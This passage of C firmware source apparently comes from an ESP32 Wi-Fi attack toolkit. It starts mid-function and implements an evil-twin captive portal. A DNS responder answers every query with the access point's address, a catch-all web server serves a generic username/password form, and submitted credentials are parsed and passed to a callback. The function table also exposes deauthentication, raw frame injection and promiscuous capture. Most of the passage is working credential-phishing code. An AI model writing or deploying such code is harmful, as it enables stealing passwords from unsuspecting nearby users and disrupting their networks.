                    char hex[3] = { body[v + 1], body[v + 2], 0 };
                    out[n++] = (uint8_t)strtol(hex, NULL, 16);
                    v += 3;
                } else { out[n++] = (uint8_t)c; v++; }
            }
            return n;
        }
    }
    return 0;
}

static esp_err_t portal_get_handler(httpd_req_t *req) {
    portal_lock();
    s_portal_http_hits++;
    char title[96];
    memcpy(title, s_portal_title, sizeof(title));
    portal_unlock();

    char page[512];
    int n = snprintf(page, sizeof(page),
        "<!DOCTYPE html><html><head><meta name=\"viewport\" "
        "content=\"width=device-width,initial-scale=1\"><title>%s</title></head>"
        "<body><h2>%s</h2><form method=\"POST\" action=\"/\">"
        "<p><input name=\"username\" placeholder=\"Username\"></p>"
        "<p><input name=\"password\" type=\"password\" placeholder=\"Password\"></p>"
        "<p><button type=\"submit\">Connect</button></p></form></body></html>",
        title, title);
    if (n < 0) n = 0;
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, page, n > (int)sizeof(page) ? (int)sizeof(page) : n);
}

static esp_err_t portal_post_handler(httpd_req_t *req) {
    char body[PORTAL_HTTP_BODY_MAX];
    int total = req->content_len < (int)sizeof(body) - 1 ? req->content_len : (int)sizeof(body) - 1;
    int received = 0;
    while (received < total) {
        int r = httpd_req_recv(req, body + received, total - received);
        if (r <= 0) break;
        received += r;
    }
    body[received > 0 ? received : 0] = 0;

    portal_cred_msg_t msg;
    memset(&msg, 0, sizeof(msg));
    msg.user_len = portal_form_field(body, (size_t)received, "username", msg.user, sizeof(msg.user));
    msg.pass_len = portal_form_field(body, (size_t)received, "password", msg.pass, sizeof(msg.pass));

    portal_lock();
    s_portal_http_hits++;
    s_portal_last_post_len = (uint8_t)(received > 95 ? 95 : (received < 0 ? 0 : received));
    memset(s_portal_last_post, 0, sizeof(s_portal_last_post));
    if (s_portal_last_post_len) memcpy(s_portal_last_post, body, s_portal_last_post_len);
    portal_unlock();

    /* Zero timeout: an HTTP request must never block because the drain has
     * fallen behind -- a dropped submission is preferable to stalling the
     * server task. */
    if (s_portal_cred_queue && (msg.user_len || msg.pass_len)) {
        (void)xQueueSend(s_portal_cred_queue, &msg, 0);
    }
    memset(&msg, 0, sizeof(msg));
    memset(body, 0, sizeof(body));

    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, "<html><body><p>Connecting...</p></body></html>", HTTPD_RESP_USE_STRLEN);
}

/* Every unmatched path returns the portal page, which is what makes OS
 * connectivity checks (/generate_204, /hotspot-detect.html, ...) surface the
 * sign-in page instead of reporting the network as already online. */
static esp_err_t portal_any_handler(httpd_req_t *req) { return portal_get_handler(req); }

static void portal_dns_task(void *arg) {
    (void)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) { s_portal_dns_task = NULL; vTaskDelete(NULL); return; }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(53);
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock); s_portal_dns_task = NULL; vTaskDelete(NULL); return;
    }
    /* Bounded so the task observes s_portal_dns_run promptly on teardown
     * instead of blocking forever in recvfrom. */
    struct timeval tv = { .tv_sec = 0, .tv_usec = 200000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    esp_netif_ip_info_t ip_info;
    memset(&ip_info, 0, sizeof(ip_info));
    if (s_ap_netif) esp_netif_get_ip_info(s_ap_netif, &ip_info);

    uint8_t buf[512];
    while (s_portal_dns_run) {
        struct sockaddr_in from;
        socklen_t from_len = sizeof(from);
        int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &from_len);
        if (n < 12) continue;   /* shorter than a DNS header: not answerable */
        portal_lock(); s_portal_dns_queries++; portal_unlock();

        /* Answer every A query with the AP's own address. The question section
         * is echoed back verbatim and a single A answer appended, which is the
         * whole of what a hijacking resolver needs to emit. */
        buf[2] |= 0x80;            /* QR = response */
        buf[3] = (uint8_t)(buf[3] & 0x70);  /* RCODE = 0, flags cleared */
        buf[6] = 0; buf[7] = 1;    /* ANCOUNT = 1 */
        buf[8] = 0; buf[9] = 0;    /* NSCOUNT = 0 */
        buf[10] = 0; buf[11] = 0;  /* ARCOUNT = 0 */
        if (n + 16 > (int)sizeof(buf)) continue;
        uint8_t *a = buf + n;
        *a++ = 0xC0; *a++ = 0x0C;          /* name: pointer to the question */
        *a++ = 0x00; *a++ = 0x01;          /* type A */
        *a++ = 0x00; *a++ = 0x01;          /* class IN */
        *a++ = 0x00; *a++ = 0x00; *a++ = 0x00; *a++ = 0x3C;  /* TTL 60s */
        *a++ = 0x00; *a++ = 0x04;          /* RDLENGTH 4 */
        memcpy(a, &ip_info.ip.addr, 4); a += 4;
        sendto(sock, buf, (size_t)(a - buf), 0, (struct sockaddr *)&from, from_len);
    }
    close(sock);
    s_portal_dns_task = NULL;
    vTaskDelete(NULL);
}

static int esp32_portal_start(const uint8_t *title, uint8_t title_len,
                               mtk_hal_portal_cred_cb_t cb, void *user) {
    if (!s_portal_mutex || !s_portal_cred_queue) {
        ESP_LOGE(TAG, "esp32_portal_start: required runtime resources missing -- refusing");
        return -1;
    }
    portal_lock();
    s_portal_cb = cb; s_portal_cb_user = user;
    s_portal_dns_queries = 0; s_portal_http_hits = 0;
    s_portal_last_post_len = 0;
    memset(s_portal_last_post, 0, sizeof(s_portal_last_post));
    memset(s_portal_title, 0, sizeof(s_portal_title));
    memcpy(s_portal_title, title, title_len > 95 ? 95 : title_len);
    portal_unlock();
    xQueueReset(s_portal_cred_queue);

    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.server_port = 80;
    cfg.lru_purge_enable = true;
    cfg.uri_match_fn = httpd_uri_match_wildcard;
    esp_err_t err = httpd_start(&s_portal_httpd, &cfg);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_portal_start: httpd_start returned %s", esp_err_to_name(err));
        s_portal_httpd = NULL;
        return -1;
    }
    httpd_uri_t post_uri = { .uri = "/*", .method = HTTP_POST, .handler = portal_post_handler, .user_ctx = NULL };
    httpd_uri_t get_uri  = { .uri = "/*", .method = HTTP_GET,  .handler = portal_any_handler,  .user_ctx = NULL };
    if (httpd_register_uri_handler(s_portal_httpd, &post_uri) != ESP_OK ||
        httpd_register_uri_handler(s_portal_httpd, &get_uri) != ESP_OK) {
        ESP_LOGE(TAG, "esp32_portal_start: URI handler registration failed -- unwinding");
        httpd_stop(s_portal_httpd); s_portal_httpd = NULL;
        return -1;
    }

    s_portal_dns_run = 1;
    if (xTaskCreate(portal_dns_task, "mtek_portal_dns", 3072, NULL, 4, &s_portal_dns_task) != pdPASS) {
        ESP_LOGE(TAG, "esp32_portal_start: xTaskCreate(dns) failed -- unwinding");
        s_portal_dns_run = 0;
        httpd_stop(s_portal_httpd); s_portal_httpd = NULL;
        return -1;
    }
    return 0;
}

static void esp32_portal_stop(void) {
    s_portal_dns_run = 0;   /* the task observes this within its recv timeout */
    if (s_portal_httpd) { httpd_stop(s_portal_httpd); s_portal_httpd = NULL; }
    portal_lock();
    s_portal_cb = NULL; s_portal_cb_user = NULL;
    /* The last POST body can contain a submitted passphrase; it must not
     * outlive the portal that captured it. Counters are kept, since
     * diagnostics remain meaningful after a stop. */
    memset(s_portal_last_post, 0, sizeof(s_portal_last_post));
    s_portal_last_post_len = 0;
    memset(s_portal_title, 0, sizeof(s_portal_title));
    portal_unlock();
    if (s_portal_cred_queue) xQueueReset(s_portal_cred_queue);
}

static void esp32_portal_service(void) {
    if (!s_portal_cred_queue) return;
    portal_cred_msg_t msg;
    /* Bounded per call so one tick cannot monopolise the calling task. */
    for (unsigned i = 0; i < PORTAL_CRED_QUEUE_LEN; i++) {
        if (xQueueReceive(s_portal_cred_queue, &msg, 0) != pdTRUE) break;
        portal_lock();
        mtk_hal_portal_cred_cb_t cb = s_portal_cb;
        void *user = s_portal_cb_user;
        portal_unlock();
        if (cb) cb(user, msg.user, msg.user_len, msg.pass, msg.pass_len);
        memset(&msg, 0, sizeof(msg));
    }
}

static int esp32_portal_stats(uint32_t *dns_out, uint32_t *http_out,
                               uint8_t *last_post, uint8_t *last_post_len) {
    portal_lock();
    *dns_out = s_portal_dns_queries;
    *http_out = s_portal_http_hits;
    *last_post_len = s_portal_last_post_len;
    if (s_portal_last_post_len) memcpy(last_post, s_portal_last_post, s_portal_last_post_len);
    portal_unlock();
    return 0;
}

static const mtk_wifi_hal_t s_hal_impl = {
    esp32_ap_scan, esp32_ap_scan_cancel, esp32_sta_scan, esp32_sta_scan_cancel, esp32_connect, esp32_disconnect, esp32_get_status,
    esp32_send_deauth, esp32_promisc_start, esp32_promisc_stop, esp32_promisc_service, esp32_set_channel,
    esp32_get_mode, esp32_set_mode, esp32_get_mac, esp32_raw_tx, esp32_restore_sta_mode,
    esp32_pace_delay_ms, esp32_quiescence_wait_ms,
    esp32_softap_start, esp32_softap_stop, esp32_softap_sta_count,
    esp32_portal_start, esp32_portal_stop, esp32_portal_service, esp32_portal_stats,
};

const mtk_wifi_hal_t *mtek_wifi_hal_esp32_get(void) {
    ESP_LOGI(TAG, "ESP32-C6 Wi-Fi HAL ready (host-tested; hardware behavior not validated)");
    return &s_hal_impl;
}

void mtek_wifi_hal_esp32_mark_promisc_task_failed(void) {
    ESP_LOGE(TAG, "mtek_wifi_hal_esp32_mark_promisc_task_failed: wifi_promisc_tick_task failed to start -- "
                   "refusing every radio-disturbing opcode rather than accept a capture/handshake session "
                   "that could never actually receive a delivered frame");
    s_wifi_resources_ready = 0;
}
